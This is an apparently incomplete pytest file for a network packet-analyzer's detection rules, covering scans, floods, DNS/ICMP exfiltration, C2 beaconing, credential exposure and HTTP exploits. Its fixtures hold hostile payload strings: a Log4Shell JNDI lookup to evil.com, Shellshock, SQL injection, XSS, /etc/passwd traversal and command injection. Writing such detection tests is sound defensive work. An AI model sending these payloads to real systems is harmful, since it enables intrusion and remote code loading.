from __future__ import annotations

from typing import Any

import pytest

from packet_analyzer import detections
from packet_analyzer.utils import DetectionPacket


def _pkt(**kw: Any) -> DetectionPacket:
    defaults: dict[str, Any] = {
        "index": 1,
        "timestamp": 1000.0,
        "src_ip": "10.0.0.1",
        "dst_ip": "10.0.0.2",
        "src_port": 40000,
        "dst_port": 80,
        "protocol": "TCP",
        "length": 100,
        "ttl": 64,
        "tcp_flags": [],
        "tcp_window": 65535,
        "content_type": None,
        "readable": None,
        "hidden_message": False,
        "icmp_id": None,
        "icmp_seq": None,
        "icmp_type": None,
        "icmp_code": None,
        "ip_more_fragments": None,
        "ip_frag_offset": None,
        "tls_version": None,
        "dns_txt_length": None,
        "double_vlan": False,
    }
    defaults.update(kw)
    return defaults  # type: ignore[return-value]


def _convo(**kw: Any) -> dict[str, Any]:
    defaults: dict[str, Any] = {
        "id": "tcp-10.0.0.1:40000-10.0.0.2:80",
        "protocol": "TCP",
        "client": "10.0.0.1:40000",
        "server": "10.0.0.2:80",
        "start_time": 1000.0,
        "end_time": 1010.0,
        "duration_sec": 10.0,
        "total_bytes": 2000,
        "total_packets": 10,
        "stream": [],
    }
    defaults.update(kw)
    return defaults


# ── TCP SYN Scan ──────────────────────────────────────────────────────────────


def test_detect_tcp_syn_scan_positive() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="TCP", dst_port=80 + i, tcp_flags=["SYN"])
        for i in range(15)
    ]
    alerts = detections.detect_tcp_syn_scan(packets, [])
    rules = {a["rule"] for a in alerts}
    assert "detect_tcp_syn_scan" in rules
    assert any("10.0.0.1" in a.get("description", "") for a in alerts)


def test_detect_tcp_syn_scan_negative_not_enough_ports() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="TCP", dst_port=80, tcp_flags=["SYN"])
        for i in range(3)
    ]
    assert detections.detect_tcp_syn_scan(packets, []) == []


def test_detect_tcp_syn_scan_negative_acks_not_scans() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="TCP", dst_port=80 + i, tcp_flags=["SYN", "ACK"])
        for i in range(15)
    ]
    assert detections.detect_tcp_syn_scan(packets, []) == []


# ── TCP Connect Scan ──────────────────────────────────────────────────────────


def test_detect_tcp_connect_scan_positive() -> None:
    packets: list[DetectionPacket] = []
    for i in range(15):
        port = 80 + i
        src, dst = "10.0.0.1", "10.0.0.2"
        packets += [
            _pkt(index=i * 4, timestamp=1000.0, protocol="TCP", src_ip=src, dst_ip=dst,
                 dst_port=port, src_port=50000, tcp_flags=["SYN"]),
            _pkt(index=i * 4 + 1, timestamp=1001.0, protocol="TCP", src_ip=dst, dst_ip=src,
                 dst_port=50000, src_port=port, tcp_flags=["SYN", "ACK"]),
            _pkt(index=i * 4 + 2, timestamp=1002.0, protocol="TCP", src_ip=src, dst_ip=dst,
                 dst_port=port, src_port=50000, tcp_flags=["ACK"]),
            _pkt(index=i * 4 + 3, timestamp=1003.0, protocol="TCP", src_ip=src, dst_ip=dst,
                 dst_port=port, src_port=50000, tcp_flags=["RST"]),
        ]
    alerts = detections.detect_tcp_connect_scan(packets, [])
    rules = {a["rule"] for a in alerts}
    assert "detect_tcp_connect_scan" in rules


# ── TCP Flag Scans ────────────────────────────────────────────────────────────


@pytest.mark.parametrize("flags,kind", [
    (["FIN"], "FIN"),
    ([], "NULL"),
    (["FIN", "PSH", "URG"], "XMAS"),
])
def test_detect_tcp_flag_scans_positive(flags: list[str], kind: str) -> None:
    pkt = _pkt(protocol="TCP", tcp_flags=flags)
    alerts = detections.detect_tcp_flag_scans([pkt], [])
    assert any(a["rule"] == "detect_tcp_flag_scan" and kind in str(a.get("evidence", {})) for a in alerts)


def test_detect_tcp_flag_scans_negative() -> None:
    pkt = _pkt(protocol="TCP", tcp_flags=["SYN", "ACK"])
    assert detections.detect_tcp_flag_scans([pkt], []) == []


# ── UDP Scan ──────────────────────────────────────────────────────────────────


def test_detect_udp_scan_positive() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="UDP", dst_port=80 + i)
        for i in range(15)
    ]
    alerts = detections.detect_udp_scan(packets, [])
    assert any(a["rule"] == "detect_udp_scan" for a in alerts)


# ── ICMP Sweep ────────────────────────────────────────────────────────────────


def test_detect_icmp_sweep_positive() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="ICMP", dst_ip=f"10.0.0.{i + 2}",
             icmp_type=8)
        for i in range(5)
    ]
    alerts = detections.detect_icmp_sweep(packets, [])
    assert any(a["rule"] == "detect_icmp_sweep" for a in alerts)


def test_detect_icmp_sweep_negative_wrong_type() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="ICMP", dst_ip=f"10.0.0.{i + 2}",
             icmp_type=0)  # Echo Reply, not request
        for i in range(5)
    ]
    assert detections.detect_icmp_sweep(packets, []) == []


# ── OS Fingerprinting ─────────────────────────────────────────────────────────


@pytest.mark.parametrize("ttl", [64, 128, 255])
def test_detect_os_fingerprinting_by_ttl(ttl: int) -> None:
    pkt = _pkt(protocol="TCP", ttl=ttl)
    alerts = detections.detect_os_fingerprinting([pkt], [])
    assert any(a["rule"] == "detect_os_fingerprinting" for a in alerts)


def test_detect_os_fingerprinting_by_tool_signature() -> None:
    pkt = _pkt(protocol="TCP", readable="nmap scan probe data here")
    alerts = detections.detect_os_fingerprinting([pkt], [])
    assert any(a["rule"] == "detect_os_fingerprinting" for a in alerts)


def test_detect_os_fingerprinting_negative() -> None:
    pkt = _pkt(protocol="TCP", ttl=47, readable="normal HTTP request")
    alerts = detections.detect_os_fingerprinting([pkt], [])
    fp_alerts = [a for a in alerts if a["rule"] == "detect_os_fingerprinting"]
    assert len(fp_alerts) == 0


# ── Service Version Probe ─────────────────────────────────────────────────────


def test_detect_service_version_probe_positive() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="TCP", dst_ip=f"10.0.0.{i + 10}",
             dst_port=443)
        for i in range(10)
    ]
    alerts = detections.detect_service_version_probe(packets, [])
    assert any(a["rule"] == "detect_service_version_probe" for a in alerts)


# ── Heartbleed ────────────────────────────────────────────────────────────────


def test_detect_heartbleed_positive() -> None:
    pkt = _pkt(protocol="TLS", content_type="HEARTBLEED REQUEST")
    alerts = detections.detect_heartbleed([pkt], [])
    assert any(a["rule"] == "detect_heartbleed" for a in alerts)


def test_detect_heartbleed_negative() -> None:
    pkt = _pkt(protocol="TLS", content_type="TLS ClientHello")
    assert detections.detect_heartbleed([pkt], []) == []


# ── HTTP Exploits ─────────────────────────────────────────────────────────────


def test_detect_shellshock() -> None:
    pkt = _pkt(protocol="HTTP", readable='GET / HTTP/1.1\r\n() { :; }; echo vulnerable\r\n')
    alerts = detections.detect_http_exploits([pkt], [])
    assert any(a["rule"] == "detect_shellshock" for a in alerts)


def test_detect_sql_injection() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET /search?q=' or '1'='1 HTTP/1.1")
    alerts = detections.detect_http_exploits([pkt], [])
    assert any(a["rule"] == "detect_sql_injection" for a in alerts)


def test_detect_xss() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET /<script>alert(1)</script> HTTP/1.1")
    alerts = detections.detect_http_exploits([pkt], [])
    assert any(a["rule"] == "detect_xss" for a in alerts)


def test_detect_directory_traversal() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET /../../../etc/passwd HTTP/1.1")
    alerts = detections.detect_http_exploits([pkt], [])
    assert any(a["rule"] == "detect_directory_traversal" for a in alerts)


def test_detect_command_injection() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET /cgi-bin/; ls HTTP/1.1")
    alerts = detections.detect_http_exploits([pkt], [])
    assert any(a["rule"] == "detect_command_injection" for a in alerts)


def test_detect_log4shell() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil.com/a}")
    alerts = detections.detect_http_exploits([pkt], [])
    assert any(a["rule"] == "detect_log4shell" for a in alerts)


def test_detect_http_exploits_negative() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET /index.html HTTP/1.1")
    assert detections.detect_http_exploits([pkt], []) == []


# ── Credential Exposure ───────────────────────────────────────────────────────


def test_detect_http_basic_auth() -> None:
    import base64
    creds = base64.b64encode(b"admin:secret123").decode()
    pkt = _pkt(protocol="HTTP", readable=f"GET / HTTP/1.1\r\nAuthorization: Basic {creds}\r\n",
               dst_port=80)
    alerts = detections.detect_credential_exposure([pkt], [])
    assert any(a["rule"] == "detect_http_basic_auth" for a in alerts)


def test_detect_http_form_credentials() -> None:
    pkt = _pkt(protocol="HTTP", readable="POST /login HTTP/1.1\r\n\r\nuser=admin&password=secret")
    alerts = detections.detect_credential_exposure([pkt], [])
    assert any(a["rule"] == "detect_http_form_credentials" for a in alerts)


def test_detect_session_token_in_url() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET /profile?token=abc123&user=bob HTTP/1.1")
    alerts = detections.detect_credential_exposure([pkt], [])
    assert any(a["rule"] == "detect_session_token_in_url" for a in alerts)


def test_detect_ftp_cleartext_credentials() -> None:
    pkt_user = _pkt(protocol="TCP", readable="USER anonymous\r\n", dst_port=21)
    pkt_pass = _pkt(protocol="TCP", readable="PASS test@example.com\r\n", dst_port=21)
    alerts = detections.detect_credential_exposure([pkt_user, pkt_pass], [])
    assert any(a["rule"] == "detect_ftp_cleartext_credentials" for a in alerts)


def test_detect_telnet_cleartext() -> None:
    pkt = _pkt(protocol="TCP", readable="some telnet data", dst_port=23)
    alerts = detections.detect_credential_exposure([pkt], [])
    assert any(a["rule"] == "detect_telnet_cleartext" for a in alerts)


def test_detect_smtp_auth_cleartext() -> None:
    pkt = _pkt(protocol="TCP", readable="AUTH LOGIN\r\n", dst_port=25)
    alerts = detections.detect_credential_exposure([pkt], [])
    assert any(a["rule"] == "detect_smtp_auth_cleartext" for a in alerts)


def test_detect_private_key_material() -> None:
    pkt = _pkt(protocol="TCP", readable="-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC")
    alerts = detections.detect_credential_exposure([pkt], [])
    assert any(a["rule"] == "detect_private_key_material" for a in alerts)


# ── DNS Exfiltration ──────────────────────────────────────────────────────────


def test_detect_dns_tunneling_by_length() -> None:
    pkt = _pkt(protocol="DNS", readable="Query: a" + "x" * 50 + ".example.com",
               src_ip="10.0.0.1")
    alerts = detections.detect_dns_exfiltration([pkt], [])
    assert any(a["rule"] == "detect_dns_tunneling" for a in alerts)


def test_detect_dns_exfiltration_volume_positive() -> None:
    packets = []
    for i in range(201):
        packets.append(
            _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="DNS",
                 readable=f"Query: sub{i}.example.com", src_ip="10.0.0.1")
        )
    alerts = detections.detect_dns_exfiltration(packets, [])
    assert any(a["rule"] == "detect_dns_exfiltration_volume" for a in alerts)


# ── ICMP Exfiltration ─────────────────────────────────────────────────────────


def test_detect_icmp_exfiltration_positive() -> None:
    pkt = _pkt(protocol="ICMP", hidden_message=True, readable="secret data hidden in icmp")
    alerts = detections.detect_icmp_exfiltration([pkt], [])
    assert any(a["rule"] == "detect_icmp_exfiltration" for a in alerts)


def test_detect_icmp_exfiltration_negative() -> None:
    pkt = _pkt(protocol="ICMP", hidden_message=False)
    assert detections.detect_icmp_exfiltration([pkt], []) == []


# ── Large DNS TXT ─────────────────────────────────────────────────────────────


def test_detect_large_dns_txt_positive() -> None:
    pkt = _pkt(protocol="DNS", dns_txt_length=300)
    alerts = detections.detect_large_dns_txt([pkt], [])
    assert any(a["rule"] == "detect_large_dns_txt" for a in alerts)


def test_detect_large_dns_txt_negative() -> None:
    pkt = _pkt(protocol="DNS", dns_txt_length=50)
    assert detections.detect_large_dns_txt([pkt], []) == []


# ── Beaconing ─────────────────────────────────────────────────────────────────


def test_detect_beaconing_positive() -> None:
    base = 1000.0
    intervals = [5.0, 5.1, 4.9, 5.0, 5.1, 4.9]  # CoV < 15%
    packets = [
        _pkt(index=i, timestamp=base + sum(intervals[:i]) + 5.0, src_ip="10.0.0.1",
             dst_ip="203.0.113.5")
        for i in range(7)
    ]
    alerts = detections.detect_beaconing(packets, [])
    assert any(a["rule"] == "detect_beaconing" for a in alerts)


def test_detect_beaconing_negative_not_enough() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 5.0, src_ip="10.0.0.1", dst_ip="203.0.113.5")
        for i in range(3)
    ]
    assert detections.detect_beaconing(packets, []) == []


def test_detect_beaconing_negative_irregular() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 10.0 + (i % 3) * 30.0, src_ip="10.0.0.1",
             dst_ip="203.0.113.5")
        for i in range(7)
    ]
    alerts = detections.detect_beaconing(packets, [])
    assert all(a["rule"] != "detect_beaconing" for a in alerts)


# ── Long Low Volume Connections ───────────────────────────────────────────────


def test_detect_long_low_volume_positive() -> None:
    convo = _convo(protocol="TCP", start_time=1000.0, end_time=1200.0, total_bytes=512)
    alerts = detections.detect_long_low_volume_connections([], [convo])
    assert any(a["rule"] == "detect_long_low_volume_tcp" for a in alerts)


def test_detect_long_low_volume_negative_high_bytes() -> None:
    convo = _convo(protocol="TCP", start_time=1000.0, end_time=1200.0, total_bytes=50000)
    assert detections.detect_long_low_volume_connections([], [convo]) == []


# ── HTTP C2 Patterns ──────────────────────────────────────────────────────────


def test_detect_missing_user_agent() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET / HTTP/1.1\r\nHost: example.com\r\n")
    alerts = detections.detect_http_c2_patterns([pkt], [])
    assert any(a["rule"] == "detect_http_c2_user_agent" for a in alerts)


def test_detect_suspicious_user_agent() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET / HTTP/1.1\r\nUser-Agent: python-requests/2.28\r\n")
    alerts = detections.detect_http_c2_patterns([pkt], [])
    assert any(a["rule"] == "detect_http_c2_user_agent" for a in alerts)


def test_detect_normal_user_agent_no_alert() -> None:
    pkt = _pkt(protocol="HTTP", readable="GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\n")
    alerts = detections.detect_http_c2_patterns([pkt], [])
    http_c2 = [a for a in alerts if a["rule"] == "detect_http_c2_user_agent"]
    assert len(http_c2) == 0


def test_detect_identical_user_agents_positive() -> None:
    packets = [
        _pkt(index=i, protocol="HTTP",
             readable=f"GET /{i} HTTP/1.1\r\nUser-Agent: python-requests/2.28\r\n",
             src_ip="10.0.0.1", dst_ip="203.0.113.5")
        for i in range(3)
    ]
    alerts = detections.detect_http_c2_identical_user_agents(packets, [])
    assert any(a["rule"] == "detect_http_c2_identical_ua" for a in alerts)


# ── TLS No SNI ────────────────────────────────────────────────────────────────


def test_detect_tls_no_sni_positive() -> None:
    pkt = _pkt(protocol="TLS", content_type="TLS ClientHello", readable="TLS ClientHello data")
    alerts = detections.detect_tls_no_sni([pkt], [])
    assert any(a["rule"] == "detect_tls_no_sni" for a in alerts)


def test_detect_tls_no_sni_negative_has_sni() -> None:
    pkt = _pkt(protocol="TLS", content_type="TLS ClientHello",
               readable="TLS ClientHello server_name=example.com")
    assert detections.detect_tls_no_sni([pkt], []) == []


# ── TLS Self-Signed ───────────────────────────────────────────────────────────


def test_detect_tls_self_signed_positive() -> None:
    pkt = _pkt(protocol="TLS", content_type="TLS Certificate",
               readable="subject: CN=test\r\nissuer: CN=test")
    alerts = detections.detect_tls_self_signed([pkt], [])
    assert any(a["rule"] == "detect_self_signed_cert" for a in alerts)


def test_detect_tls_self_signed_negative() -> None:
    pkt = _pkt(protocol="TLS", content_type="TLS Certificate",
               readable="subject: CN=test\r\nissuer: CN=CA")
    assert detections.detect_tls_self_signed([pkt], []) == []


# ── Known Bad Ports ───────────────────────────────────────────────────────────


def test_detect_known_bad_ports_positive() -> None:
    for port in [4444, 6667, 31337]:
        pkt = _pkt(protocol="TCP", src_ip="10.0.0.1", dst_ip="203.0.113.5", dst_port=port)
        alerts = detections.detect_known_bad_ports([pkt], [])
        assert any(a["rule"] == "detect_known_bad_ports" for a in alerts), f"Failed for port {port}"


def test_detect_known_bad_ports_negative_external_source() -> None:
    pkt = _pkt(protocol="TCP", src_ip="203.0.113.5", dst_ip="10.0.0.1", dst_port=4444)
    assert detections.detect_known_bad_ports([pkt], []) == []


# ── ARP Spoofing ──────────────────────────────────────────────────────────────


def test_detect_arp_spoofing_positive() -> None:
    packets = [
        _pkt(index=0, protocol="ARP", readable="192.168.1.1 is at aa:bb:cc:dd:ee:01"),
        _pkt(index=1, protocol="ARP", readable="192.168.1.1 is at aa:bb:cc:dd:ee:02"),
    ]
    alerts = detections.detect_arp_spoofing(packets, [])
    assert any(a["rule"] == "detect_arp_spoofing" for a in alerts)


def test_detect_arp_spoofing_negative() -> None:
    packets = [
        _pkt(index=0, protocol="ARP", readable="192.168.1.1 is at aa:bb:cc:dd:ee:01"),
        _pkt(index=1, protocol="ARP", readable="192.168.1.2 is at aa:bb:cc:dd:ee:01"),
    ]
    assert detections.detect_arp_spoofing(packets, []) == []


# ── ARP Flood ─────────────────────────────────────────────────────────────────


def test_detect_arp_flood_positive() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="ARP", src_ip="10.0.0.1")
        for i in range(51)
    ]
    alerts = detections.detect_arp_flood(packets, [])
    assert any(a["rule"] == "detect_arp_flood" for a in alerts)


def test_detect_arp_flood_negative() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="ARP", src_ip="10.0.0.1")
        for i in range(3)
    ]
    assert detections.detect_arp_flood(packets, []) == []


# ── ICMP Flood ────────────────────────────────────────────────────────────────


def test_detect_icmp_flood_positive() -> None:
    start = 0.0
    packets = [
        _pkt(index=i, timestamp=start + i * 0.005, protocol="ICMP", icmp_type=8,
             src_ip="10.0.0.1", dst_ip="10.0.0.2")
        for i in range(150)  # 150 / 0.75s = 200 pps > 100
    ]
    alerts = detections.detect_icmp_flood(packets, [])
    assert any(a["rule"] == "detect_icmp_flood" for a in alerts)


def test_detect_icmp_flood_negative() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 10.0, protocol="ICMP", icmp_type=8)
        for i in range(5)
    ]
    assert detections.detect_icmp_flood(packets, []) == []


# ── TCP SYN Flood ─────────────────────────────────────────────────────────────


def test_detect_tcp_syn_flood_positive() -> None:
    start = 0.0
    packets = [
        _pkt(index=i, timestamp=start + i * 0.002, protocol="TCP", tcp_flags=["SYN"],
             src_ip="10.0.0.1", dst_ip="10.0.0.2")
        for i in range(300)  # 300 / 0.598s ≈ 501 pps > 200
    ]
    alerts = detections.detect_tcp_syn_flood(packets, [])
    assert any(a["rule"] == "detect_tcp_syn_flood" for a in alerts)


def test_detect_tcp_syn_flood_negative() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 10.0, protocol="TCP", tcp_flags=["SYN"])
        for i in range(5)
    ]
    assert detections.detect_tcp_syn_flood(packets, []) == []


# ── DNS Amplification ─────────────────────────────────────────────────────────


def test_detect_dns_amplification_positive() -> None:
    query = _pkt(protocol="DNS", content_type="DNS Query", length=40, timestamp=1000.0,
                 src_ip="10.0.0.1", dst_ip="8.8.8.8")
    # Response 50x query size (40 * 50 = 2000)
    response = _pkt(protocol="DNS", content_type="DNS Response", length=2000, timestamp=1000.1,
                    src_ip="8.8.8.8", dst_ip="10.0.0.1")
    alerts = detections.detect_dns_amplification([query, response], [])
    assert any(a["rule"] == "detect_dns_amplification" for a in alerts)


# ── VLAN Hopping ──────────────────────────────────────────────────────────────


def test_detect_vlan_hopping_positive() -> None:
    pkt = _pkt(protocol="VLAN", double_vlan=True)
    alerts = detections.detect_vlan_hopping([pkt], [])
    assert any(a["rule"] == "detect_vlan_hopping" for a in alerts)


def test_detect_vlan_hopping_negative() -> None:
    pkt = _pkt(protocol="VLAN", double_vlan=False)
    assert detections.detect_vlan_hopping([pkt], []) == []


# ── Large HTTP POST ───────────────────────────────────────────────────────────


def test_detect_large_http_post_positive() -> None:
    body = "A" * 1_500_000  # > 1MB
    pkt = _pkt(index=0, timestamp=1000.0, protocol="HTTP",
               readable=f"POST /upload HTTP/1.1\r\n\r\n{body}",
               src_ip="10.0.0.1", dst_ip="203.0.113.5")
    alerts = detections.detect_large_http_post([pkt], [])
    assert any(a["rule"] == "detect_large_http_post" for a in alerts)


# ── Policy Violations ─────────────────────────────────────────────────────────


def test_detect_unencrypted_internal_http() -> None:
    pkt = _pkt(protocol="HTTP", dst_port=80, src_ip="10.0.0.1", dst_ip="10.0.0.2")
    alerts = detections.detect_policy_violations([pkt], [])
    assert any(a["rule"] == "detect_unencrypted_internal_http" for a in alerts)


@pytest.mark.parametrize("port", [21, 23, 25])
def test_detect_unencrypted_protocol(port: int) -> None:
    pkt = _pkt(protocol="TCP", dst_port=port, src_ip="10.0.0.1", dst_ip="10.0.0.2")
    alerts = detections.detect_policy_violations([pkt], [])
    assert any(a["rule"] == "detect_unencrypted_protocol" for a in alerts)


@pytest.mark.parametrize("version", ["0x0301", "0x0302"])
def test_detect_deprecated_tls(version: str) -> None:
    pkt = _pkt(protocol="TLS", tls_version=version, src_ip="10.0.0.1", dst_ip="10.0.0.2")
    alerts = detections.detect_policy_violations([pkt], [])
    assert any(a["rule"] == "detect_deprecated_tls" for a in alerts)


def test_detect_internal_ip_header() -> None:
    pkt = _pkt(protocol="HTTP", content_type="HTTP response",
               readable="HTTP/1.1 200 OK\r\nX-Forwarded-For: 10.0.0.5\r\n",
               src_ip="10.0.0.1", dst_ip="10.0.0.2")
    alerts = detections.detect_policy_violations([pkt], [])
    assert any(a["rule"] == "detect_internal_ip_header" for a in alerts)


def test_detect_amqp_secret_strings() -> None:
    pkt = _pkt(protocol="AMQP", readable="login password=supersecret",
               src_ip="10.0.0.1", dst_ip="10.0.0.2")
    alerts = detections.detect_policy_violations([pkt], [])
    assert any(a["rule"] == "detect_amqp_secret_strings" for a in alerts)


# ── Anomalies ─────────────────────────────────────────────────────────────────


def test_detect_new_host_mid_capture() -> None:
    packets = [
        _pkt(index=0, timestamp=0.0, src_ip="10.0.0.1", dst_ip="10.0.0.2"),
        _pkt(index=50, timestamp=10.0, src_ip="10.0.0.1", dst_ip="192.168.1.99"),
    ]
    alerts = detections.detect_anomalies(packets, [], total_packets=2)
    assert any(a["rule"] == "detect_new_host_mid_capture" for a in alerts)


def test_detect_traffic_spike() -> None:
    packets = [
        _pkt(index=i, timestamp=float(i) * 5.0) for i in range(5)  # 1 per window
    ] + [
        _pkt(index=i + 5, timestamp=100.0) for i in range(10)  # 10 in one 5s window
    ]
    alerts = detections.detect_anomalies(packets, [], total_packets=15)
    assert any(a["rule"] == "detect_traffic_spike" for a in alerts)


def test_detect_port_reuse() -> None:
    packets = [
        _pkt(index=i, src_ip="10.0.0.1", src_port=55555, dst_ip=f"10.0.0.{i + 2}")
        for i in range(4)
    ]
    alerts = detections.detect_anomalies(packets, [], total_packets=len(packets))
    assert any(a["rule"] == "detect_port_reuse" for a in alerts)


def test_detect_asymmetric_conversation() -> None:
    stream = [
        {"direction": "client→server", "length": 100},
        {"direction": "client→server", "length": 100},
        {"direction": "server→client", "length": 10},
    ]
    convo = _convo(protocol="TCP", client="10.0.0.1:40000", server="10.0.0.2:80",
                   stream=stream, total_bytes=210)
    # Need at least one packet since detect_anomalies early-returns on empty packets
    pkt = _pkt(index=0, timestamp=0.0, src_ip="10.0.0.1", dst_ip="10.0.0.2")
    alerts = detections.detect_anomalies([pkt], [convo], total_packets=4)
    assert any(a["rule"] == "detect_asymmetric_conversation" for a in alerts)


def test_detect_ttl_anomaly() -> None:
    pkt = _pkt(ttl=1)
    alerts = detections.detect_anomalies([pkt], [], total_packets=1)
    assert any(a["rule"] == "detect_ttl_anomaly" for a in alerts)


def test_detect_ttl_anomaly_negative() -> None:
    pkt = _pkt(ttl=64)
    alerts = detections.detect_anomalies([pkt], [], total_packets=1)
    assert all(a["rule"] != "detect_ttl_anomaly" for a in alerts)


def test_detect_fragmented_ip() -> None:
    pkt = _pkt(protocol="TCP", ip_more_fragments=True, ip_frag_offset=0)
    alerts = detections.detect_anomalies([pkt], [], total_packets=1)
    assert any(a["rule"] == "detect_fragmented_ip" for a in alerts)


# ── run_detections integration ────────────────────────────────────────────────


def test_run_detections_integration() -> None:
    """Verify run_detections processes positive cases end-to-end."""
    syn_pkts = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, protocol="TCP", dst_port=80 + i, tcp_flags=["SYN"])
        for i in range(15)
    ]
    tls_pkt = _pkt(index=100, timestamp=1100.0, protocol="TLS", content_type="TLS ClientHello",
                   readable="no sni here")
    alerts = detections.run_detections(syn_pkts + [tls_pkt], [], total_packets=len(syn_pkts) + 1)
    rules = {a["rule"] for a in alerts}
    assert "detect_tcp_syn_scan" in rules
    assert "detect_tls_no_sni" in rules
    assert "detect_os_fingerprinting" in rules  # TTL=64 triggers this


def test_run_detections_empty() -> None:
    assert detections.run_detections([], [], total_packets=0) == []


# ── SMB exploit ────────────────────────────────────────────────────────────────


def test_detect_smb_exploit_smb1_on_445() -> None:
    pkt = _pkt(dst_port=445, readable="\xff\x53\x4d\x42 SMBv1 session")
    alerts = detections.detect_smb_exploit([pkt], [])
    assert any(a["rule"] == "detect_smb_exploit" for a in alerts)
    assert any(a["severity"] == "CRITICAL" for a in alerts)


def test_detect_smb_exploit_smb2_not_critical() -> None:
    pkt = _pkt(dst_port=445, readable="SMBv2 session")
    alerts = detections.detect_smb_exploit([pkt], [])
    # SMBv2 should not trigger CRITICAL, but check no SMB1 match
    critical = [a for a in alerts if a["severity"] == "CRITICAL"]
    assert len(critical) == 0


def test_detect_smb_exploit_no_match() -> None:
    pkt = _pkt(dst_port=443, readable="HTTP request")
    assert detections.detect_smb_exploit([pkt], []) == []


# ── SSH brute-force ────────────────────────────────────────────────────────────


def test_detect_ssh_bruteforce_positive() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, dst_port=22, tcp_flags=["SYN"])
        for i in range(6)  # 6 SYN packets to SSH in <1s
    ]
    alerts = detections.detect_ssh_bruteforce(packets, [])
    assert any(a["rule"] == "detect_ssh_bruteforce" for a in alerts)
    assert any(a["severity"] == "HIGH" for a in alerts)


def test_detect_ssh_bruteforce_too_few() -> None:
    packets = [
        _pkt(index=i, timestamp=1000.0 + i * 0.1, dst_port=22, tcp_flags=["SYN"])
        for i in range(3)  # Only 3 SYN packets, threshold is 5
    ]
    assert detections.detect_ssh_bruteforce(packets, []) == []


def test_detect_ssh_bruteforce_not_ssh_port() -> None:
    pkt = _pkt(dst_port=443, tcp_flags=["SYN"])
    assert detections.detect_ssh_bruteforce([pkt], []) == []


# ── QUIC traffic ───────────────────────────────────────────────────────────────


def test_detect_quic_traffic_positive() -> None:
    pkt = _pkt(protocol="UDP", dst_port=443, readable="QUIC v1 initial")
    alerts = detections.detect_quic_traffic([pkt], [])
    assert any(a["rule"] == "detect_quic_traffic" for a in alerts)
    assert any(a["severity"] == "LOW" for a in alerts)


def test_detect_quic_traffic_not_udp() -> None:
    pkt = _pkt(protocol="TCP", dst_port=443, readable="QUIC v1")
    assert detections.detect_quic_traffic([pkt], []) == []


def test_detect_quic_traffic_no_match() -> None:
    pkt = _pkt(protocol="UDP", dst_port=53, readable="DNS query")
    assert detections.detect_quic_traffic([pkt], []) == []


# ── Incident Timeline Tests ──────────────────────────────────────────────────


def _alert(
    rule: str,
    src_ip: str = "10.0.0.1",
    dst_ip: str = "10.0.0.2",
    severity: str = "HIGH",
    timestamp: float = 0,
    count: int = 1,
    description: str = "",
) -> dict[str, Any]:
    return {
        "rule": rule,
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "severity": severity,
        "timestamp": timestamp,
        "count": count,
        "description": description,
    }


class TestBuildIncidentTimelines:
    def test_empty_alerts(self) -> None:
        assert detections.build_incident_timelines([]) == []

    def test_single_alert_no_incident(self) -> None:
        alerts = [_alert("detect_tcp_syn_scan", timestamp=0)]
        assert detections.build_incident_timelines(alerts) == []

    def test_same_stage_no_incident(self) -> None:
        # Both recon — need 2 different stages
        alerts = [
            _alert("detect_tcp_syn_scan", timestamp=0),
            _alert("detect_udp_scan", timestamp=5),
        ]
        assert detections.build_incident_timelines(alerts) == []

    def test_two_stages_creates_incident(self) -> None:
        alerts = [
            _alert("detect_tcp_syn_scan", timestamp=0, description="SYN scan"),
            _alert("detect_heartbleed", timestamp=10, dst_ip="10.0.0.3",
                   description="Heartbleed"),
        ]
        incidents = detections.build_incident_timelines(alerts)
        assert len(incidents) == 1
        inc = incidents[0]
        assert inc["incident_id"] == "INC-1"
        assert inc["src_ip"] == "10.0.0.1"
        assert set(inc["stages_observed"]) == {"recon", "exploit"}
        assert "recon → exploit" in inc["kill_chain"]
        assert inc["total_alerts"] == 2

    def test_multi_source_separate_incidents(self) -> None:
        alerts = [
            _alert("detect_tcp_syn_scan", src_ip="10.0.0.1", timestamp=0),
            _alert("detect_heartbleed", src_ip="10.0.0.1", timestamp=5,
                   dst_ip="10.0.0.5"),
            _alert("detect_tcp_syn_scan", src_ip="10.0.0.2", timestamp=10),
            _alert("detect_large_http_post", src_ip="10.0.0.2", timestamp=12,
                   dst_ip="10.0.0.6"),
        ]
        incidents = detections.build_incident_timelines(alerts)
        assert len(incidents) == 2
        assert incidents[0]["src_ip"] == "10.0.0.1"
        assert incidents[1]["src_ip"] == "10.0.0.2"

    def test_beyond_time_window_no_incident(self) -> None:
        alerts = [
            _alert("detect_tcp_syn_scan", timestamp=0),
            _alert("detect_heartbleed", timestamp=301, dst_ip="10.0.0.3"),
        ]
        assert detections.build_incident_timelines(alerts) == []

    def test_three_stage_kill_chain(self) -> None:
